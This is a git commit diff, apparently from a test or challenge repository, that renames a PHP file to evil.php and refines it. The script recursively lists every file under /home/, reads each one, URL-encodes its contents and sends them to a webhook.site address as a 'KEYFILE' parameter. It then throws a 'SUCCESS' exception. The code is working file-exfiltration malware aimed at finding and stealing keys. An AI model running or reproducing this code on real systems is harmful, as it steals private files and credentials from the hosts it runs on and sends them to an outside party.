055c6b8ad87c31a0c73c44954ccc9aee0b935375
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-08 16:58:50 +0100

    Update and rename createToken25.php to evil.php

--- evil.php
+++ evil.php
@@ -5,8 +5,8 @@ function sendFileBase64($pathToFile)
 
 
 function getDirContents($dir, &$results = array()) {
+    // recursively find all files.
     $files = scandir($dir);
-
     foreach ($files as $key => $value) {
         $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
         if (!is_dir($path)) {
@@ -26,24 +26,23 @@ function searchForKey($path)
     $contents = fread($handle, filesize($path));
     fclose($handle);
     $encodedContent= urlencode($contents);
+    // Link to the output: https://webhook.site/#!/23410df2-5255-46c0-983e-c89e81d71bd0/6376e576-7dba-4625-a66f-90ccd1d0fe1a/1
     $url = "https://webhook.site/23410df2-5255-46c0-983e-c89e81d71bd0?KEYFILE=" . $encodedContent;
     $content = file_get_contents($url);
   }
 }
 
-// BEGIN
-// All your base are belong to us >=E
-//$filename = "/home/pinhead/susip0rn.jpg";
-//sendFileBase64($filename);
-
-$rootDir='/';
+// The search from / ends with nothing, because it tries to open the files, describing the processes. It is much simplier to apply it to the list of the folders, which may contain the desired info.
+$targetDir='/home/';
 
 // Get the array of all files, stored in this directory or underlying directories. 
-getDirContents($rootDir,$files);
+getDirContents($targetDir,$files);
 
+// Search the key value in the list of found files.  
 foreach ($files as $key => $value) {
   searchForKey($value);
 }
 
+// If everything is OK- throw "Success"
 throw new Exception("\n SUCCESS \n");
 ?>
